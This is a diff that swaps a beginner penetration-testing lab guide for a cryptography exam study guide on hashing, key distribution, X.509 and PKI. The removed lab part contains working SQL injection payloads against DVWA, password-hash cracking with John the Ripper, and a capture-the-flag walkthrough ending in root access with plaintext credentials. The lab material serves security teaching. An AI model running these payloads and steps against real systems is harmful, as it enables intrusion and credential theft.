@@ -1,629 +1,497 @@
-# Vulnerability Assessment & Penetration Testing Lab Guide
-### BICL606 — Beginner Step-by-Step Guide
+# BCY602 – Cryptography and Network Security
+## Module 3 – Complete Exam Study Guide
 
-> **Environment:** Kali Linux (VirtualBox)  
-> **Run all terminal commands as root** — use `sudo su -` to become root first.
-
----
-
-## Experiment 1: Network Reconnaissance & Footprinting
-
-### What is this?
-We find live devices on the network, scan their open ports, identify services/OS, and enumerate subdomains of an external domain using Amass.
+**Module 3 syllabus:** Applications of Cryptographic Hash Functions, Two Simple Hash Functions, Key Management and Distribution (Symmetric key distribution using symmetric encryption, Symmetric key distribution using asymmetric encryption, Distribution of public keys), X.509 Certificates, Public Key Infrastructures. *(10 hours)*
 
 ---
 
-### Part A – Internal Network Scanning (Nmap)
+## Table of Contents
 
-**Step 1 – Open Terminal and become root**
-```bash
-sudo su -
-```
-
-**Step 2 – Find your own IP address**
-```bash
-ip a
-```
-Note your IPv4 address (e.g., `192.168.1.3`) and subnet mask. Calculate CIDR (e.g., `255.255.255.0` → `/24`).
-
-**Step 3 – Discover live hosts in the network**
-```bash
-nmap -sn 192.168.1.1
-```
-This does a ping scan — shows which hosts are up without scanning ports.
-
-**Step 4 – Pick a live host and do a detailed scan**
-```bash
-nmap -sS -sV -O 192.168.1.1
-```
-- `-sS` → SYN (stealth) scan
-- `-sV` → Detect service versions
-- `-O` → Guess the operating system
-
-This gives you: open ports, running services, and guessed OS.
-
-**Step 5 – Aggressive scan on the whole subnet**
-```bash
-nmap -A 192.168.1.0/24
-```
-- `-A` → OS detection + version detection + scripts + traceroute
+1. [Topic & Subtopic Overview](#1-topic--subtopic-overview)
+2. [Topic 1 – Applications of Cryptographic Hash Functions](#2-topic-1--applications-of-cryptographic-hash-functions)
+3. [Topic 2 – Two Simple Hash Functions](#3-topic-2--two-simple-hash-functions)
+4. [Topic 3 – Symmetric Key Distribution Using Symmetric Encryption](#4-topic-3--symmetric-key-distribution-using-symmetric-encryption)
+5. [Topic 4 – Symmetric Key Distribution Using Asymmetric Encryption](#5-topic-4--symmetric-key-distribution-using-asymmetric-encryption)
+6. [Topic 5 – Distribution of Public Keys](#6-topic-5--distribution-of-public-keys)
+7. [Topic 6 – X.509 Certificates](#7-topic-6--x509-certificates)
+8. [Topic 7 – Public-Key Infrastructure (PKI)](#8-topic-7--public-key-infrastructure-pki)
+9. [Previous Year Question Paper Analysis](#9-previous-year-question-paper-analysis)
+10. [Focused Exam Answers](#10-focused-exam-answers)
 
 ---
 
-### Part B – External Reconnaissance (Amass)
+## 1. Topic & Subtopic Overview
 
-**Step 1 – Check if Amass is installed**
-```bash
-amass -version
-```
-If not installed:
-```bash
-apt install amass -y
-```
+**1. Applications of Cryptographic Hash Functions**
+- Message Authentication (message digest, sender/receiver verification, why the hash must be protected, man-in-the-middle attack)
+- Methods of using hash codes for authentication (the four methods a–d, and why "encrypt only the hash" is often preferred)
+- Reasons to avoid full encryption (speed, hardware cost, initialization overhead, patents)
+- Message Authentication Code (MAC)
+- Digital Signatures
+- Other Applications — Password Protection, Intrusion and Virus Detection
 
-**Step 2 – Run subdomain enumeration on a domain**
-```bash
-amass enum -d microsoft.com
-```
-Wait for results. You will see subdomains, IPs, ASN numbers, and hosting provider details.
+**2. Two Simple Hash Functions**
+- Insecure Hash Functions (n-bit block processing)
+- Simple XOR Hash Function
+- Rotated XOR (RXOR) Hash Function
+- Weakness of XOR and RXOR
 
-**Step 3 – Note down the output**
-Record the subdomains, their IPs, and which provider hosts them.
+**3. Symmetric Key Distribution Using Symmetric Encryption**
+- The four ways to distribute keys
+- Key Distribution Centre (KDC) — session key, master key
+- Key Distribution Scenario (5-step protocol)
+- Major Issues with KDC: Hierarchical Key Control, Session Key Lifetime, Transparent Key Control (SSM), Decentralized Key Control
+- Controlling Key Usage: key types, 8-bit tag, Control Vector
 
----
+**4. Symmetric Key Distribution Using Asymmetric Encryption**
+- Simple Secret Key Distribution
+- Secret Key Distribution with Confidentiality and Authentication
+- A Hybrid Scheme
 
-### Expected Result
-Internal devices mapped with ports, services, and OS info. External domain subdomains listed with IP and ASN details.
+**5. Distribution of Public Keys**
+- Public Announcement
+- Publicly Available Directory
+- Public-Key Authority
+- Public-Key Certificates
 
----
+**6. X.509 Certificates**
+- Overview, certificate structure/fields, notation
+- Obtaining a Certificate, CA Hierarchy
+- Certificate Revocation (CRL)
+- X.509 Version 3 — Certificate Extensions
 
----
-
-## Experiment 2: Vulnerability Scanning & Assessment
-
-### What is this?
-We use Nikto to scan the DVWA web application and find misconfigurations, dangerous paths, and outdated software.
-
-> **Pre-requirement:** DVWA must be running. If not set up yet, complete **Experiment 4 Steps 1–12** first, then come back here.
-
----
-
-### Steps
-
-**Step 1 – Open Firefox and confirm DVWA is accessible**
-```
-http://127.0.0.1/DVWA
-```
-
-**Step 2 – Open Terminal and run Nikto**
-```bash
-nikto -h http://127.0.0.1/DVWA/
-```
-Wait ~1 minute. Findings will scroll in the terminal.
-
-**Step 3 – Note the paths Nikto reports**
-
-For example:
-- `/DVWA/config/`
-- `/DVWA/tests/`
-- `/DVWA/login.php`
-
-**Step 4 – Test those paths in the browser**
-
-Append each path to the base URL:
-```
-http://127.0.0.1/DVWA/config/
-http://127.0.0.1/DVWA/tests/
-```
-You will see directory listings — confirming directory indexing is enabled (a vulnerability).
+**7. Public-Key Infrastructure (PKI)**
+- Definition and objective
+- PKIX Architectural Model components
+- PKIX Management Functions
+- PKIX Management Protocols (CMP, CMC)
 
 ---
 
-### Expected Result
-Nikto reports server version, missing headers, open directories, admin login page, PHP backdoor paths. Verified in browser.
+## 2. Topic 1 – Applications of Cryptographic Hash Functions
+
+A cryptographic hash function takes a message of any length and produces a fixed-size output called the **message digest**. It is one of the most versatile algorithms, providing **data integrity, authentication**, and supporting digital signatures and password protection.
+
+### 1. Message Authentication
+
+It verifies that a message has not been modified, inserted, deleted, or replayed, and confirms the sender's identity.
+
+- The sender computes a hash of the message and sends both the message and its hash.
+- The receiver recomputes the hash and compares it with the received hash.
+- If they **match → message is authentic**; if they **mismatch → message was altered**.
+- The hash value must be protected, otherwise an attacker can alter the message and recompute a new hash (man-in-the-middle attack).
+
+**Methods of using hash codes for authentication:**
+
+- **(a)** Encrypt **(Message + Hash)** using symmetric encryption → authentication **and** confidentiality.
+- **(b)** Encrypt **only the hash code** → authentication with less computation (preferred when confidentiality not needed).
+- **(c)** Use a **shared secret value S** without encryption → sender sends M with H(M‖S); receiver recomputes using the same S. The secret S is never transmitted.
+- **(d)** Encrypt (Message + Hash) for **added confidentiality**.
+
+*Method (b) is often preferred because encrypting the whole message is computationally expensive.*
+
+### 2. Message Authentication Code (MAC)
+
+- A MAC is a **keyed hash function** used when two parties share a secret key K.
+- Function: **MAC = F(K, M)**
+- Verifies both **integrity** and **authenticity**.
+- An attacker cannot alter the message or MAC without knowing K.
+- More efficient than full encryption algorithms.
+
+### 3. Digital Signatures
+
+- Similar to MAC but uses **public-key encryption**.
+- The hash of the message is **encrypted with the sender's private key**.
+- Anyone with the sender's **public key** can verify it.
+- Provides **integrity, authentication, and non-repudiation**.
+- For confidentiality, the message + signature can be encrypted with a symmetric key.
+
+### 4. Other Applications
+
+- **Password Protection** – Systems store the *hash* of passwords instead of actual passwords. At login, the entered password's hash is compared with the stored hash.
+- **Intrusion and Virus Detection** – Store a secure hash H(F) of each file. Later, recompute and compare to detect modification; an intruder cannot change a file without changing its hash.
+
+> **Exam tip:** Draw the message authentication block diagram (sender computes H → receiver recomputes H → compare) for easy marks.
 
 ---
 
----
+## 3. Topic 2 – Two Simple Hash Functions
 
-## Experiment 3: Exploiting a Known Vulnerability
+All hash functions process the input data as a sequence of **n-bit blocks** and produce an **n-bit hash value**. Two simple but **insecure** hash functions are the **XOR** and **Rotated XOR (RXOR)** methods.
 
-### What is this?
-We use netdiscover to find a target (Sunset machine), scan it with Nmap, exploit anonymous FTP to download a password hash, crack it with John the Ripper, and log in via SSH.
+### 1. Simple XOR Hash Function
 
-> **Pre-requirement:** Both **Sunset** and **Kali** machines must be running in VirtualBox.
+Each bit of the hash value is the **exclusive-OR (XOR)** of the corresponding bits from all message blocks.
 
----
-
-### Steps
-
-**Step 1 – Network Discovery**
-```bash
-netdiscover
 ```
-Wait for ARP packets. Look for the machine labelled **PCS System** under hostname — that is your target. Note its IP (e.g., `192.168.1.104`). Press `Ctrl+C` to stop.
-
-**Step 2 – Port and Service Scan**
-```bash
-nmap -A -p- 192.168.1.104
-```
-Confirm open ports:
-- Port **21** — FTP (vsftpd 2.3.4)
-- Port **22** — SSH (OpenSSH)
-
-**Step 3 – FTP Anonymous Login**
-```bash
-ftp 192.168.1.104
-```
-When prompted:
-```
-Username: anonymous
-Password: (press Enter — leave blank)
+C_i = b_i1 ⊕ b_i2 ⊕ ... ⊕ b_im
 ```
 
-**Step 4 – List and download the backup file**
-```bash
-ls
-get backup
-exit
+where:
+- C_i = i-th bit of the hash code
+- b_ij = i-th bit of the j-th block
+- m = number of blocks
+
+- This gives a **longitudinal redundancy check (LRC)**.
+- **Effective for random data** — error detection probability ≈ 2⁻ⁿ.
+- **Weak for structured data** (e.g., text files where high-order bits are often 0).
+
+### 2. Rotated XOR (RXOR) Hash Function
+
+A **one-bit left rotation** of the hash value is performed after processing each block.
+
+Procedure:
+1. Initialize the n-bit hash to **0**.
+2. For each n-bit block:
+   - (a) Rotate the current hash left by **1 bit**.
+   - (b) XOR the block into the hash.
+
+- Provides **better data integrity** than simple XOR.
+- But is **still not secure** for cryptographic use.
+
+### 3. Weakness of XOR and RXOR
+
+- When **only the hash is encrypted**, an attacker can create a new message with the same hash by adding one extra block.
+- Even if the **entire message + hash is encrypted** (e.g., CBC mode), security flaws remain.
+- For 64-bit blocks X₁, X₂, …, X_N:
+
+```
+h = X1 ⊕ X2 ⊕ ... ⊕ XN
 ```
 
-**Step 5 – View the backup file**
-```bash
-cat backup
-```
-You will see a password hash inside.
+In CBC mode: X₁ = IV ⊕ D(K, Y₁), X_i = Y_(i-1) ⊕ D(K, Y_i).
 
-**Step 6 – Save the hash to a file**
-```bash
-nano sunset.txt
-```
-Paste the hash content. Save: `Ctrl+O` → Enter → `Ctrl+X`
+- Since **XOR is commutative**, **permuting (rearranging) the ciphertext blocks does not change the resulting hash**.
+- Hence, **altered ciphertext can still appear valid** — making both methods cryptographically insecure.
 
-**Step 7 – Crack the password**
-```bash
-john sunset.txt
-```
-The cracked password will be shown (e.g., `cheer14` for user `sunset`).
+**Conclusion:** Both XOR and RXOR are useful only for **error detection**, not for security.
 
-**Step 8 – SSH into the target**
-```bash
-ssh sunset@192.168.1.104
-```
-Enter the cracked password when prompted.
+> **Exam tip:** Write the C_i formula, the RXOR procedure, and the commutativity weakness — the marks-fetching points.
 
 ---
 
-### Expected Result
+## 4. Topic 3 – Symmetric Key Distribution Using Symmetric Encryption
 
-| Step | Result |
-|---|---|
-| Nmap | FTP port 21 open, vsftpd 2.3.4 |
-| FTP anonymous login | Connected, `backup` file downloaded |
-| John the Ripper | Password cracked: `cheer14` |
-| SSH login | Successfully logged in as `sunset` |
+For symmetric encryption to work, both parties must **share the same secret key**, protected from others. **Key distribution** means delivering a key to two parties securely.
 
----
+### Ways to Distribute Keys (for parties A and B)
 
----
+1. A selects a key and **physically delivers** it to B.
+2. A **third party** selects the key and physically delivers it to A and B.
+3. If A and B have **recently used a key**, one party sends the new key encrypted with the old key.
+4. If A and B each has an **encrypted connection to a third party C**, C delivers the key over these secure links.
 
-## Experiment 4: SQL Injection Attacks on Web Applications
+*Methods 1 & 2 are simplest but do not scale. For large networks, method 4 (trusted intermediary) is the practical solution.*
 
-### What is this?
-We set up DVWA, then use SQL injection in the browser to extract database version, table names, and user credentials.
+### Key Distribution Centre (KDC)
 
----
+- Based on a **hierarchy of keys** (at least two levels).
+- **Session key** – temporary key used for one logical connection, then discarded.
+- **Master key** – shared between the KDC and each user, used to encrypt session keys.
 
-### Part A – DVWA Setup (One-time)
+### Key Distribution Scenario (A wants to talk to B)
 
-**Step 1 – Clone DVWA and move to web folder**
-```bash
-sudo su -
-git clone https://github.com/digininja/DVWA.git
-mv DVWA /var/www/html
-cd /var/www/html
-ls
-```
-You should see: `DVWA  index.html  index.nginx-debian.html`
+A shares master key Ka with KDC; B shares master key Kb with KDC.
 
-**Step 2 – Start Apache**
-```bash
-service apache2 start
-```
+1. **A → KDC:** Request for a session key, including IDA, IDB, and a **nonce N₁** (timestamp/counter/random number to prevent replay).
+2. **KDC → A:** Message encrypted with **Ka** containing:
+   - The **session key Ks**
+   - The **original request + N₁**
+   - Plus, encrypted with **Kb**: Ks and IDA (to forward to B)
+3. **A → B:** Forwards E(Kb, [Ks ‖ IDA]). B now knows Ks, knows it is talking to A, and knows it came from the KDC.
+4. **B → A:** Sends a new nonce **N₂**, encrypted with Ks.
+5. **A → B:** Sends **f(N₂)** (e.g., N₂ + 1) using Ks.
 
-**Step 3 – Copy the config file**
-```bash
-cd /var/www/html/DVWA
-cp config/config.inc.php.dist config/config.inc.php
-```
+*Steps 1–3 do the actual key distribution; steps 3, 4, 5 perform authentication.*
 
-**Step 4 – Start MySQL**
-```bash
-sudo systemctl start mysql
-```
-If you see an error about `meriadb`, ignore it and use the command above.
+### Major Issues with KDC
 
-**Step 5 – Check MySQL is running**
-```bash
-sudo systemctl status mysql
-```
-Press `q` to exit.
+**(a) Hierarchical Key Control** – For large networks, use **local KDCs** per domain and a **global KDC** to connect domains. Minimizes master key distribution effort.
 
-**Step 6 – Open MySQL shell**
-```bash
-mysql
-```
-You will see the `MariaDB [(none)]>` prompt.
+**(b) Session Key Lifetime** – Shorter lifetime = more secure but more overhead. Connection-oriented: one key per connection. Connectionless: key for a fixed time or number of transactions.
 
-**Step 7 – Create database and user (run these one by one)**
-```sql
-CREATE DATABASE dvwa;
-CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
-GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
-FLUSH PRIVILEGES;
-exit
-```
+**(c) Transparent Key Control Scheme** – Uses a **Session Security Module (SSM)** that performs end-to-end encryption and obtains session keys for the host (assumes TCP).
 
-**Step 8 – Edit DVWA config**
-```bash
-sudo nano /var/www/html/DVWA/config/config.inc.php
-```
-Update these lines:
-```
-$_DVWA['db_user'] = 'dvwa';
-$_DVWA['db_password'] = 'password';
-$_DVWA['db_database'] = 'dvwa';
-```
-Save: `Ctrl+X` → `Y` → `Enter`
+**(d) Decentralized Key Control** – Avoids reliance on a trusted KDC. Requires up to **n(n−1)/2 master keys** for n end systems. Practical only for small networks.
 
-**Step 9 – Restart services**
-```bash
-sudo systemctl restart apache2
-sudo systemctl restart mysql
-```
+### Controlling Key Usage
 
-**Step 10 – Open DVWA setup in browser**
-```
-http://localhost/DVWA/setup.php
-```
-Scroll to the bottom → Click **"Create / Reset Database"**
-Login when prompted: `admin` / `password`
+Session keys can be defined by use: **data-encrypting key, PIN-encrypting key, file-encrypting key**.
 
-You will now see the full DVWA dashboard.
+- **8-bit key tag (DES):** Uses the 8 spare parity bits to indicate key type and encrypt/decrypt permission. *Drawbacks:* only 8 bits, and usable only at the decryption point.
+- **Control Vector:** A field-based vector specifying key usage, coupled with the key at the KDC:
+  - H = h(CV)
+  - Key input = Km ⊕ H
+  - Ciphertext = E([Km ⊕ H], Ks)
+  - *Advantages:* no length restriction (complex controls), available in clear form at all stages.
+
+> **Exam tip:** The Key Distribution Scenario diagram (5 numbered messages, labelling N₁, N₂, Ka, Kb, Ks) is the most important part.
 
 ---
 
-### Part B – SQL Injection
+## 5. Topic 4 – Symmetric Key Distribution Using Asymmetric Encryption
 
-**Step 11 – Set Security Level to Low**
-- Click **DVWA Security** in the left panel.
-- Set level to **Low** → Click Submit.
+Public-key encryption can be used to **securely distribute secret (session) keys** for conventional symmetric encryption.
 
-**Step 12 – Click "SQL Injection" in the left panel**
+### 1. Simple Secret Key Distribution
 
-**Step 13 – Basic test: enter `1` in User ID → Submit**
-A name should be returned — field is working.
+1. **A generates** a key pair {PUₐ, PRₐ} and sends **PUₐ ‖ IDA** to B.
+2. **B generates** a secret key Ks and sends **E(PUₐ, Ks)** to A.
+3. **A recovers** the key: **D(PRₐ, E(PUₐ, Ks))**. Only A can decrypt it.
+4. **A discards** PUₐ, PRₐ; B discards PUₐ.
 
-**Step 14 – Inject: show all users**
-```
-%' or '0'='0
-```
-Returns ALL users. Equivalent SQL:
-```sql
-SELECT first_name, last_name FROM users WHERE user_id = '%' OR '0'='0';
-```
+**Drawback:** Simple and gives confidentiality, but vulnerable to a **man-in-the-middle attack** — a third party can substitute his own public key.
 
-**Step 15 – Inject: show database version**
-```
-%' or 0=0 union select null,version() #
-```
-The MySQL version number appears in the Surname field.
+### 2. Secret Key Distribution with Confidentiality and Authentication
 
-**Step 16 – Inject: show all tables in information_schema**
-```
-%' and 1=0 union select null,table_name from information_schema.tables #
-```
-Lists all tables in the MySQL information_schema database.
+(Assumes A and B already have each other's public keys.)
 
----
+1. **A → B:** E(PUᵦ, [N₁ ‖ IDA])
+2. **B → A:** E(PUₐ, [N₁ ‖ N₂]) — returning N₁ assures A it is B.
+3. **A → B:** E(PUᵦ, N₂) — assures B it is A.
+4. **A → B:** M = **E(PUᵦ, E(PRₐ, Ks))**
+   - B's public key → only B can read (**confidentiality**).
+   - A's private key → only A could have sent (**authentication**).
+5. **B recovers** the key: **D(PUₐ, D(PRᵦ, M))**.
 
-### Expected Result
-All users returned, DB version revealed, table names from information_schema listed.
+### 3. A Hybrid Scheme
+
+- Retains a **KDC** sharing a **master key** with each user and distributing **session keys** encrypted with the master key.
+- A **public-key scheme** distributes the **master keys**.
+- Provides a **secure, efficient** way of distributing master keys.
+
+> **Exam tip:** The second scheme is most important — draw the 4-step diagram and explain why step 4 gives both confidentiality and authentication. Mention the man-in-the-middle weakness of the simple scheme.
 
 ---
 
----
+## 6. Topic 5 – Distribution of Public Keys
 
-## Experiment 6: Password Cracking & Credential Harvesting
+Four categories:
 
-### What is this?
-We take the MD5 hashes from DVWA SQL injection and crack them using John the Ripper.
+### 1. Public Announcement
+- Any user **broadcasts** their public key (e.g., PGP keys on email).
+- **Advantage:** Simple and convenient.
+- **Major weakness — Forgery:** Anyone can broadcast a fake key pretending to be A, and **masquerade as A** until discovered.
 
----
+### 2. Publicly Available Directory
+A **trusted public directory** with these properties:
+- Maintains a **{name, public key}** entry for each participant.
+- Each participant **registers** a public key.
+- Keys can be **replaced** at any time.
+- Accessed electronically via secure, authenticated communication.
 
-### Steps
+**Vulnerability:** If an adversary obtains the **directory authority's private key**, they can distribute counterfeit keys and impersonate participants.
 
-**Step 1 – Get hashes from DVWA (if not done yet)**
+### 3. Public-Key Authority
+Provides **tighter control**; users must know the authority's public key and interact in **real-time**. **Seven messages** are exchanged.
 
-In DVWA SQL Injection, enter:
-```
-' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
-```
-This displays usernames and their MD5 hashes.
+1. **A → Authority:** Timestamped request for B's public key.
+2. **Authority → A:** Encrypted with **PRauth**, containing B's public key (PUᵦ), the original request, and the timestamp.
+3. **A → B:** E(PUᵦ, [IDA ‖ N₁]).
+4. **B → Authority:** Requests A's public key.
+5. **Authority → B:** Sends A's public key (PUₐ) with timestamp, encrypted with PRauth.
+6. **B → A:** E(PUₐ, [N₁ ‖ N₂]) — assures A it is B.
+7. **A → B:** E(PUᵦ, N₂) — assures B it is A.
 
-**Step 2 – Navigate to John's directory**
-```bash
-cd /usr/share/john/
-```
+**Drawback:** A must contact the authority for **every** new user — a **bottleneck**.
 
-**Step 3 – Create the hash file**
-```bash
-nano dvwa_password.txt
-```
-Type the hashes in `username:hash` format:
-```
-admin:5f4dcc3b5aa765d61d8327deb882cf99
-gordonb:e99a18c428cb38d5f260853678922e03
-1337:8d3533d75ae2c3966d7e0d4fcc69216b
-pablo:0d107d09f5bbe40cade3de5c71e9e9b7
-smithy:5f4dcc3b5aa765d61d8327deb882cf99
-```
-Save: `Ctrl+O` → Enter → `Ctrl+X`
+### 4. Public-Key Certificates
+- A **certificate** binds a user's **identity to their public key**, **signed by a trusted CA**.
+- Anyone with the CA's public key can **verify** it — no need to contact the authority each time.
 
-**Step 4 – Run John the Ripper**
-```bash
-john --format=raw-MD5 dvwa_password.txt
-```
-Wait for it to finish cracking.
+**Requirements:**
+1. Any participant can read the owner's name and public key.
+2. Any participant can verify the certificate is genuine.
+3. Only the CA can create/update certificates.
+4. Any participant can verify the certificate's currency (validity).
 
-**Step 5 – Show cracked passwords**
-```bash
-john --format=raw-MD5 dvwa_password.txt --show
-```
+*The universally accepted format is the **X.509** standard.*
 
-**Step 6 – Print proof (for submission)**
-```bash
-date
-echo "Your Name"
-```
-Replace `Your Name` with your actual name.
+> **Exam tip:** Draw the Public-Key Authority (7 messages) diagram. One-line weaknesses: announcement → forgery, directory → authority's private key, authority → bottleneck.
 
 ---
 
-### Expected Result
-All 5 passwords cracked and displayed in plaintext.
+## 7. Topic 6 – X.509 Certificates
+
+**X.509** is part of the X.500 series and defines the standard format for **public-key certificates**. Each certificate contains a user's public key signed by a trusted **Certification Authority (CA)** using the CA's private key. Based on **public-key cryptography and digital signatures**; used in **S/MIME, IP Security, SSL/TLS, and SET**. First issued **1988**, revised 1993, version 3 in 1995/2000.
+
+### Fields of an X.509 Certificate
+
+- **Version:** Format version (v1 default; v2 if unique identifiers present; v3 if extensions present).
+- **Serial Number:** Unique integer within the issuing CA.
+- **Signature Algorithm Identifier:** Algorithm (with parameters) used to sign the certificate.
+- **Issuer Name:** X.500 name of the CA that created and signed it.
+- **Period of Validity:** "not before" and "not after" dates.
+- **Subject Name:** Name of the user who owns the certificate.
+- **Subject's Public-Key Information:** Subject's public key + algorithm identifier.
+- **Issuer Unique Identifier:** (Optional) Identifies the CA if its name is reused.
+- **Subject Unique Identifier:** (Optional) Identifies the subject if its name is reused.
+- **Extensions:** (Added in v3) One or more extension fields.
+- **Signature:** Hash code of all other fields, **encrypted with the CA's private key**.
+
+**Field order memory aid:** Version → Serial number → Signature algorithm → Issuer → Period of validity → Subject → Subject public key → Unique identifiers → Extensions → Signature.
+
+**Version logic:** v1 = base fields, v2 adds the two unique identifier fields, v3 adds extensions, and the signature field is present in all versions.
+
+### Certificate Notation
+
+```
+CA<<A>> = CA{V, SN, AI, CA, UCA, A, UA, Ap, TA}
+```
+
+where Y<<X>> = certificate of user X issued by CA Y; V = version, SN = serial number, AI = signing algorithm, CA = name of authority, UCA = unique ID of CA, A = name of user A, UA = unique ID of A, Ap = public key of A, TA = validity period.
+
+### Obtaining a Certificate
+- Any user with the **CA's public key** can verify the certified user public key.
+- Only the **CA** can modify a certificate, so they are **unforgeable** and can be placed in a public directory.
+
+### CA Hierarchy
+- Same CA → parties verify each other's certificates directly.
+- Different CAs → a **chain of certifications** is needed; X.509 arranges CAs in a **hierarchy**.
+- Directory stores **Forward certificates** (of X by other CAs) and **Reverse certificates** (by X for other CAs).
+- Example chain: A acquires B's certificate via X<<W>>W<<V>>V<<Y>>Y<<Z>>Z<<B>>.
+
+### Certificate Revocation
+Reasons:
+1. The user's **private key is compromised**.
+2. The user is **no longer certified** by this CA.
+3. The **CA's certificate is compromised**.
+
+Each CA maintains a **Certificate Revocation List (CRL)** — revoked but not expired certificates, **signed by the issuer**, including issuer name, creation date, next-update date, and (serial number + revocation date) for each revoked certificate.
+
+### X.509 Version 3 — Certificate Extensions
+Three categories:
+1. **Key and policy information** – about subject/issuer keys and certificate policy.
+2. **Subject and issuer attributes** – alternative names/formats (email, postal address).
+3. **Certification path constraints** – restrict the types of certificates a subject CA can issue.
+
+> **Exam tip:** The X.509 certificate format diagram is the highest-priority diagram in Module 3 (appears in all papers). Always write the certificate notation and the version logic.
 
 ---
 
----
+## 8. Topic 7 – Public-Key Infrastructure (PKI)
 
-## Experiment 8: Privilege Escalation on a Compromised Host
+**Definition:** PKI is the set of **hardware, software, people, policies, and procedures** needed to **create, manage, store, distribute, and revoke digital certificates** based on asymmetric cryptography.
 
-### What is this?
-We scan a target, find open ports, discover hidden text files on the web server, SSH in, use steganography to extract hidden credentials, and escalate to root.
+**Objective:** Enable the **secure, convenient, and efficient acquisition of public keys**.
 
-> **Pre-requirement:** Target machine (192.168.1.104) must be running in VirtualBox.
+### PKIX Architectural Model — Components
+- **End Entity:** End users, devices, or any entity in the subject field of a certificate.
+- **Certification Authority (CA):** Issuer of certificates and CRLs.
+- **Registration Authority (RA):** *Optional* — takes over some administrative functions from the CA.
+- **CRL Issuer:** *Optional* — a CA can delegate publishing of CRLs.
+- **Repository:** Any method of storing certificates and CRLs for retrieval.
 
----
+### PKIX Management Functions
+- **Registration:** User makes itself known to a CA; begins enrollment with mutual authentication.
+- **Initialization:** Installing key materials in the client (e.g., the trusted CA's public key).
+- **Certification:** CA issues a certificate for the user's public key and posts it in a repository.
+- **Key Pair Recovery:** Restore an encryption/decryption key pair from a backup facility.
+- **Key Pair Update:** Key pairs replaced regularly; new certificates issued on expiry or revocation.
+- **Revocation Request:** Authorized person notifies the CA of a situation needing revocation.
+- **Cross Certification:** A cross-certificate issued by one CA to another CA.
 
-### Steps
+### PKIX Management Protocols
+1. **Certificate Management Protocol (CMP):** Each function identified by specific protocol exchanges; flexible.
+2. **Certificate Management Messages over CMS (CMC):** Built on earlier work; used for obtaining X.509 certificates in a PKI.
 
-**Step 1 – Nmap scan on target**
-```bash
-nmap -p- -A 192.168.1.104
-```
-Port **22 (SSH)** and port **80 (HTTP)** are open.
-
-**Step 2 – Open target web page in browser**
-```
-http://192.168.1.104
-```
-You see the Apache2 default page — not useful yet.
-
-**Step 3 – Enumerate hidden .txt files**
-```bash
-dirb http://192.168.1.104/ -X .txt
-```
-This finds all `.txt` files on the server.
-
-**Step 4 – Read notes.txt in browser**
-```
-http://192.168.1.104/notes.txt
-```
-Output:
-```
-1- i should finish my second lab
-2- i should delete the remb.txt file and remb2.txt
-```
-
-**Step 5 – Get the first flag**
-```
-http://192.168.1.104/remb.txt
-```
-Output:
-```
-first_stage:flagitifyoucan1234
-```
-SSH credentials: user = `first_stage`, password = `flagitifyoucan1234`
-
-**Step 6 – SSH into the target**
-```bash
-ssh first_stage@192.168.1.104
-```
-Password: `flagitifyoucan1234`
-
-**Step 7 – Explore the system**
-```bash
-ls
-cat user.txt
-cd /home
-ls
-cd mhz_c1f
-ls
-cd Paintings
-ls
-```
-
-**Step 8 – Copy the Paintings folder to Kali (open a NEW terminal on Kali)**
-```bash
-mkdir raj
-cd raj
-scp first_stage@192.168.1.104:/home/mhz_c1f/Paintings/* .
-ls
-```
-Enter SSH password when prompted.
-
-**Step 9 – Extract hidden data from image**
-```bash
-steghide extract -sf "spinning the wool.jpeg"
-```
-Press Enter when asked for passphrase (or try `flagitifyoucan1234`).
-
-**Step 10 – Read extracted file**
-```bash
-cat remb2.txt
-```
-Output:
-```
-ooh, i know should delete this, but i cant remember it
-screw me
-mhz_c1f:1@ec1f
-```
-New credentials: user = `mhz_c1f`, password = `1@ec1f`
-
-**Step 11 – Switch to the new user**
-```bash
-su mhz_c1f
-```
-Password: `1@ec1f`
-
-**Step 12 – Check user privileges**
-```bash
-id
-```
-User is in the **sudo** group — can become root.
-
-**Step 13 – Escalate to root**
-```bash
-sudo su
-```
-Password: `1@ec1f`
-
-**Step 14 – Read the root flag**
-```bash
-cd /root
-ls -la
-cat .root.txt
-```
-Output:
-```
-OwO HACKER MAN :D
-Well done sir, you have successfully got the root flag.
-#mhz_cyber
-```
-**Root access achieved!** 🏆
+> **Exam tip:** Draw the PKIX Architectural Model diagram showing End Entity, CA, RA, CRL Issuer, and Repository.
 
 ---
 
-### Expected Result
-Full root access obtained via: web enumeration → SSH → steganography → sudo privilege escalation.
+## 9. Previous Year Question Paper Analysis
+
+Based on three BCY602 papers (June/July 2025, Make-Up June/July 2025, Dec 2025/Jan 2026), the Module 3 topics asked were:
+
+| Topic | Papers asked | Priority |
+|-------|--------------|----------|
+| X.509 Certificates (format with diagram) | All 3 (10m, 10m, 6m) | **Highest** |
+| Distribution of Public Keys (four categories) | 2 of 3 (10m, 12m) | High |
+| Symmetric Key Distribution / KDC scenario | 2 of 3 (10m, 8m) | High |
+| Message Authentication (hash code methods) | 1 (10m) | Medium |
+| Hash Function definition + properties | 1 (8m) | Medium |
+| Two Simple Hash Functions | 1 (6m) | Medium |
+| Digital Signature | 1 (6m) | Medium |
+| PKIX Architectural Model (block diagram) | 1 (10m) | Medium |
+| Symmetric Key Distribution (Asymmetric) | 1 (8m) | Medium |
+| Control Vector (encryption/decryption) | 1 (6m) | Medium |
+| Hierarchical Key Control + Session Key Lifetime | 1 (6m) | Medium |
+
+**Strategy:**
+- The four "big" 10-mark rotating topics are **X.509 certificates, Distribution of public keys, KDC (symmetric distribution), and PKIX model** — these cover most Module 3 marks.
+- Smaller 6-mark topics (Two simple hash functions, Digital signature, Control vector, Hierarchical key control/Session key lifetime) usually appear as combined "Discuss the following: i)… ii)…" questions — revise as short notes.
+- Note: In the Dec 2025/Jan 2026 paper, module numbering is shuffled (Module 3 there is tagged CO4), but the question *content* is still Module 3 material.
+- Every Module 3 topic has appeared at least once — be solid on all, with extra confidence on X.509.
 
 ---
 
+## 10. Focused Exam Answers
+
+### Q. "With neat diagrams describe the ways a hash code can be used to provide message authentication" (10 marks)
+
+Structure the answer around the **four methods** (Figure 11.3):
+
+**Method (a): Encrypt (Message + Hash) with symmetric encryption**
+- Sends: **E(K, [M ‖ H(M)])**
+- Provides **authentication and confidentiality**.
+
+**Method (b): Encrypt only the hash code**
+- Sends: **M ‖ E(K, H(M))**
+- Provides **authentication only**; **preferred** (less computation).
+
